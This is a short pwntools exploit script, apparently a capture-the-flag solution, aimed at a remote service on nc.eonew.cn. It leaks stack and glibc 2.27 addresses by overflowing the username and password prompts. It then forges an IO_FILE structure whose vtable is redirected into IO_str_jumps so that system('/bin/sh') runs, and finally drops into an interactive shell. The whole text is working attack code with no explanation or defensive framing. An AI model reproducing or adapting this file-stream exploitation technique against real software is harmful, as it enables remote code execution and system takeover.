from pwn import *
from IO_FILE import *

###Addr
#  libc2.27
bin_sh_offset = 0x1b3e9a
IO_str_jumps_offset = 0x3e8360
system_offset = 0x4f440

###Exploit
r = remote('nc.eonew.cn',10016)

r.sendlineafter('Username: ','a'*0x200)
r.sendlineafter('Password: ','a'*0x100)
main_rsp = u64(r.recvline()[-9:-3]+b'\x00\x00')-0x330
print(hex(main_rsp))

r.sendlineafter('Username: ','c'*0x300)
r.sendlineafter('Password: ','c'*0x200)
libc_base = u64(r.recvline()[-9:-3]+b'\x00\x00')-0x50e8
print(hex(libc_base))

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags = 0xfbad0000,
                           buf_base = libc_base+bin_sh_offset,
                           lock = main_rsp+0x770,
                           mode = 0xffffffff,
                           vtable = libc_base+IO_str_jumps_offset-0x38)
stream = stream+p64(0)+p64(libc_base+system_offset)
r.sendlineafter('Username: ',stream)
r.sendlineafter('Password: ',b'a'*0x5f0+p64(main_rsp+0x10))

r.interactive()

